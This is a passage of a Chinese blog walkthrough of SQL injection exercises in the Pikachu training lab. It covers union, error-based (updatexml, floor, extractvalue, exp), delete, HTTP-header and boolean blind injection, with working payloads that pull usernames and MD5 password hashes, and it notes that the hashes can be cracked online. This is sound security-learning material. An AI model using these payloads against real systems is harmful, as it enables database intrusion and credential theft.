class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> pikachu  <span class="hljs-operator">|</span> <span class="hljs-number">670</span>b14728ad9902aecba32e22fa4f6bd <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> test     <span class="hljs-operator">|</span> e99a18c428cb38d5f260853678922e03 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br></code></pre></td></tr></table></figure><p>对md5进行解密（例如<a href="https://www.cmd5.com/">cmd5</a>），得到密码。</p><p>例如e10adc3949ba59abbe56e057f20f883e解密得到abc123.</p><h2 id="2-字符型注入（get）"><a href="#2-字符型注入（get）" class="headerlink" title="2.字符型注入（get）"></a>2.字符型注入（get）</h2><p>这题是get类型，参数通过url传递（关于post和get详解<a href="https://blog.csdn.net/guorui_java/article/details/112294323">见此</a>）。</p><p>其实总体流程和数字型差不多，只不过此处输入的数据类型为字符型。</p><p>字符需要用引号括起来。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326133757588.png" alt="image-20230326133757588"></p><p>输入aaa’进行测试，页面返回：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’aaa’’’  at line 1</p></blockquote><p>单引号改成双引号不会报错。</p><p>猜测内部的查询语句为：<code>select xxx from member where username = &#39;__&#39;;</code></p><p>搜索信息的语句和数字型的没太多区别。</p><p>例如查询全部信息，输入<code>a&#39; or 1=1#。</code></p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326134351926.png" alt="image-20230326134351926" style="zoom:50%;" /><p>最后加上的**#**是注释符，让后面的’失效。如果#无法生效，可以转换为url编码的<code>%23</code>。</p><p>除此之外，还有<code>--+</code>，其中<code>--</code>表示行注释，<code>+</code>表示空格，如果<code>--</code>直接和单引号连接在一起是错误的，中间需要空格语句才能生效。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 这是正确的注释</span><br><span class="hljs-comment">--这是错误的注释</span><br>#这也是单行注释<br><span class="hljs-comment">/*这是块注释*/</span><br></code></pre></td></tr></table></figure><p>例如查询pikachu库里的表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><blockquote><p>your uid:1<br>your email is: httpinfo,member,message,users,xssblind</p></blockquote><p>例如查询用户名密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select username,password from users#</span><br></code></pre></td></tr></table></figure><blockquote><p>your uid:admin<br>your email is: e10adc3949ba59abbe56e057f20f883e</p><p>your uid:pikachu<br>your email is: 670b14728ad9902aecba32e22fa4f6bd</p><p>your uid:test<br>your email is: e99a18c428cb38d5f260853678922e03</p></blockquote><h2 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326142139656.png" alt="image-20230326142139656" style="zoom:50%;" /><p>根据用户名的一部分进行搜索。</p><p>猜测是<code>select username,email from member where username like &#39;%_%&#39;;</code></p><p>测试<code>a%&#39; or 1=1#</code>，查询出所有结果。</p><p>测试<code>a%&#39; order by 4#</code>报错，见回显可知查询的列数为3.</p><h2 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h2><p>先弄清楚查询的格式。</p><p>输入<code>a&#39;</code>进行测试，回显如下：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’a’’)’ at line 1</p></blockquote><p>猜测是 <code>（&#39;查询内容&#39;) </code>这样的格式。</p><p>进行测试：<code>a&#39;) or 1=1 #</code>，显示出了所有的查询结果。</p><h2 id="5-insert-x2F-update-注入（报错注入）"><a href="#5-insert-x2F-update-注入（报错注入）" class="headerlink" title="5.insert&#x2F;update 注入（报错注入）"></a>5.insert&#x2F;update 注入（报错注入）</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326150806229.png" alt="image-20230326150806229" style="zoom:50%;" /><p>select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。</p><p>修改个人信息页面使用update更新数据，可使用。</p><p><strong>常见的几种报错注入函数：</strong></p><p>1.updatexml()</p><p>2.floor()</p><p>3.extractvalue()</p><p>4.exp()</p><h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml()"></a>1.updatexml()</h3><p>改变（查找并替换）XML文档中符合条件的节点的值。</p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string (Xpath格式的字符串) </p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>返回内容：若xpath正确则返回更改对象名称，否则返回xpath错误内容</p></blockquote><p>意味着updatexml的第一个参数和第三个参数都不重要，利用第二个参数即可。（<a href="http://c.biancheng.net/python_spider/xpath.html">xpath简单教程</a>）</p><p>例如，payload为<code>&#39; and updatexml(1,version(),3)#</code>。</p><p>回显为：<code>XPATH syntax error: &#39;.28&#39;</code></p><p>查看数据库得知version为5.7.28，发现报错显示不全。</p><p>测试<code>&#39; and updatexml(1,concat(0x7e,version()),3)#</code>，回显出<del>5.7.28.（ASCII里的0x7e就是</del>，而xpath中没有~，所以格式会报错）。</p><p>其他的信息查询也一样，只是格式改变。</p><p>例如查询表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; limit 0,1)),0)#</span><br><span class="hljs-string"></span><br><span class="hljs-string">-- 回显为 XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>httpinfo<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>要做查询的个数限制（limit 0,1)，否则会报错.</p><p>updatexml最多输出32个字节，超出的时候可以使用substring。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 前32位</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1), 0)),0)#</span><br><span class="hljs-string">-- 32位后</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-number">32</span>)),<span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure><p>可截取的函数：</p><ul><li>mid函数： 返回从指定位置开始的子字符串</li><li>substr函数：返回指定的子字符串</li><li>concat函数： 返回连接的字符串</li></ul><h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor()"></a>2.floor()</h3><p>floor()可实现向下取整。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span>           <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br></code></pre></td></tr></table></figure><p>rand()可以得到0和1之间的随机数。但如果传入参数，会返回的数字是固定的（伪随机）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand()              <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.09440490984768132</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.02</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> rand()             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.9136333120182467</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><br><span class="hljs-comment">-- 传入参数0</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>floor(rand()) 的结果为0.</p><p>floor(rand(0)*2)的结果是0或1，因为rand()返回的值在0和1之间，乘以2就是0和2之间，向下取反后结果是0或1。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><p>可见生成了固定的随机序列（01101）。</p><p>count()用于计数、group by可进行筛选分组。</p><p>使用count(*)和group by查询表，是先创建一个虚拟表，一条条读取原表，再填进虚拟表。读取到没有的就写入、有的就count+1.</p><p>可以让它们组合起来获取信息。</p><p>例如构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version()))<span class="hljs-keyword">as</span> test <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> test;<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1|5.7.28&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;&lt;group_key&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>版本信息被暴露在报错里。</p><p><strong>报错原理如下：</strong></p><p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version()))as test from users group by test;</code></p><p>等同于</p><p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version())) from users group by (floor(rand(0)*2),0x7c,(select version()))</code></p><p>首先会建立一个虚拟表。</p><p>然后执行第一个<code>floor(rand(0)*2)</code>，结果为0|5.7.28。group by会再执行一次（第二次调用），结果为1|5.7.28。</p><p>此时并没有1|5.7.28，所以插入该Key，count为1.</p><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>1|5.7.28</td><td>1</td></tr></tbody></table><p>因为<code>floor(rand(0)*2)</code>的结果数列为0、1、1、0、1</p><p>接着向下执行，第二次的结果（第三、第四次调用）分别为1|5.7.28和0|5.7.28。</p><p>此时key为1|5.7.28的count值加一。</p><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>1|5.7.28</td><td>2</td></tr></tbody></table><p>但key中没有0|5.7.28，所以加入新的key。</p><p>加入新的key，需要再一次调用floor(rand(0)*2)，也就是第五次调用，这时候的结果为1。</p><p>可是1|5.7.28已经存在了，再一次添加就会报错。</p><p>所以报错为<code>ERROR 1062 (23000): Duplicate entry &#39;1|5.7.28&#39; for key &#39;&lt;group_key&gt;&#39;</code>，意为添加了重复条目。</p><p>可以通过这个报错来获取我们需要的信息。</p><p><strong>注意：表中最少要3条数据，否则不会报错。</strong></p><h3 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3.extractvalue()"></a>3.extractvalue()</h3><blockquote><p>1.函数含义： 使用 XPath 表示法从 XML 字符串中提取值，即返回的是一个字符串。</p><p>2.用法</p><p>ExtractValue(xml_frag, xpath_expr)</p><p>两个字符串参数：</p><p>(1) xml_frag: XML 标记片段，xml语言的标签闭合内的值，</p><p>(2) xpath_expr: XPath 表达式，匹配xml标签内的值并返回。</p></blockquote><p>例如：<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))# </code></p><p>和updatexml用法类似。</p><h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp()"></a>4.exp()</h3><blockquote><p>EXP(number)</p><p>参数为次方值。</p><p><code>EXP()</code> 函数返回自然常数 <code>e</code> 的指定数值的次方。</p><p>如果参数 <code>number</code> 为 <code>NULL</code>，<code>EXP()</code> 函数将会返回 <code>NULL</code>。</p></blockquote><p>由于mysql记录的double数值有限，当exp的值大于709时，就会引起溢出错误。</p><p>pow()也是类似。</p><p><code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version());<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version())  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">18446744073709551610</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><br><span class="hljs-comment">-- 例如</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())x));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9849">详情见此</a></p><p>ps:MySQL&gt;5.5.53不可用。</p><h2 id="6-delete注入"><a href="#6-delete注入" class="headerlink" title="6.delete注入"></a>6.delete注入</h2><p>和insert&#x2F;update注入一样，使用报错注入。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013652464.png" alt="image-20230328013652464" style="zoom: 50%;" /><p>留言后删除，使用bp进行抓包，对id值进行修改。</p><p>此处payload为<code>1 or updatexml(1,concat(0x7e,database()),0)</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013814090.png" alt="image-20230328013814090"></p><p>将payload进行处理。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013904797.png" alt="image-20230328013904797" style="zoom:50%;" /><p>回显获得了数据库名：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013943409.png" alt="image-20230328013943409" style="zoom:33%;" /><h2 id="7-http-header-注入"><a href="#7-http-header-注入" class="headerlink" title="7.http header 注入"></a>7.http header 注入</h2><p>和insert&#x2F;update 注入页面类似的登录页面，输入用户名密码即可登录。</p><p>登录后回显出一些信息：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328104838427.png" alt="image-20230328104838427" style="zoom:50%;" /><p>注入就从回显的信息入手，回显的信息都是http报文的内容。</p><h3 id="HTTP报文分析"><a href="#HTTP报文分析" class="headerlink" title="HTTP报文分析"></a>HTTP报文分析</h3><p>http报文由<strong>三部分</strong>组成：<strong>状态行（请求行&#x2F;相应行）、首部、主体</strong></p><p>http报文可以分为<strong>请求报文</strong>和<strong>响应报文</strong>（客户端发送请求，服务器响应请求）。</p><p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105626168.png" alt="《图解http》-请求报文" style="zoom:33%;" /><p>响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代 码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105909551.png" alt="《图解http》-响应报文" style="zoom: 33%;" /><p>http头注入的<strong>产生原因</strong>：没有对http头中的User-agent、Referer、Cookie等进行过滤。</p><p>以下为案例请求包（不要抓错）：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pikachu/vul/sqli/sqli_header/sqli_header.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br>User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/pikachu/vul/sqli/sqli_header/sqli_header_login.php<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure><p><strong>常见的http头部注入：UA头注入、Referer注入、Cookie注入</strong></p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>User-Agent</td><td>HTTP 客户端程序的信息</td></tr><tr><td>Referer</td><td>对请求中 URI 的原始获取方</td></tr><tr><td>Cookie</td><td>存储数据<br />（例如：使无状态的HTTP协议变成有状态的session连接、登录权限）</td></tr></tbody></table><h3 id="1-UA头注入"><a href="#1-UA头注入" class="headerlink" title="1.UA头注入"></a>1.UA头注入</h3><p>也就是User-Agent处注入。</p><p>先进行<code>&#39;</code>测试。</p><p>回显：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;&#x27;</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>直接输入1回显正常。</p><p>多次测试后，猜测有insert行为，可以使用报错注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- payload</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database()),1) and &#x27;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328171330234.png" alt="image-20230328171330234" style="zoom:33%;" /><p>成功回显数据库.</p><p>其他几种报错注入的测试：</p><ul><li>floor()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 版本</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br><br><span class="hljs-comment">-- 回显用户名密码</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select group_concat(username,0x3a,password) from users),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>extravalue()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-Cookie注入"><a href="#2-Cookie注入" class="headerlink" title="2.Cookie注入"></a>2.Cookie注入</h3><p>一样的报错注入。</p><p>payload：<code>&#39; and updatexml(1,concat(0x7e,database()),0)#</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin&#x27; and updatexml(1,concat(0x7e,database()),0)#; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br></code></pre></td></tr></table></figure><h2 id="8-盲注（基于boolean）"><a href="#8-盲注（基于boolean）" class="headerlink" title="8.盲注（基于boolean）"></a>8.盲注（基于boolean）</h2><p>当后台使用了一些方法，使回显不出现我们想要的信息，此时进行注入叫做盲注。</p><p><strong>有三种常见的盲注方法：布尔盲注、时间盲注、运行错误盲注</strong></p><p>由于手工注入十分麻烦，建议使用工具。</p><p>常用函数：</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>substr()</td><td>用来截取字符串</td></tr><tr><td>sleep()</td><td>用来制造延时用来截取字符串</td></tr><tr><td>if(ex1,ex2,ex3)</td><td>判断语句，ex1正确执行ex2，错误执行ex3</td></tr></tbody></table><p>对该题目进行测试：</p><p>输入正确的用户名，回显正确uid和email。</p><p>输入错误的用户名，回显“您输入的username不存在，请重新输入！”</p><p>输入正确用户名+<code>&#39; and 1=1#</code>，回显正确uid和email。</p><p>输入正确用户名+<code>&#39; and 1=2#</code>，回显“您输入的username不存在，请重新输入！”。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328182334135.png" alt="image-20230328182334135" style="zoom:33%;" /><p>说明内部会进行判断，且有注入漏洞存在。</p><p>输入payload进行测试，先测试<strong>数据库的长度</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- test1为已经存在的用户</span><br>test1<span class="hljs-string">&#x27; and length(database())&gt;=1#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;=</span><span class="hljs-number">7</span>#   回显正常<br>test1<span class="hljs-string">&#x27; and length(database())&gt;=8#   回显错误</span><br></code></pre></td></tr></table></figure><p>这也就意味着数据库的长度为7.</p><p>下一步来判断数据库的具体名字，使用substr和ascii判断。</p><figure class="highlight 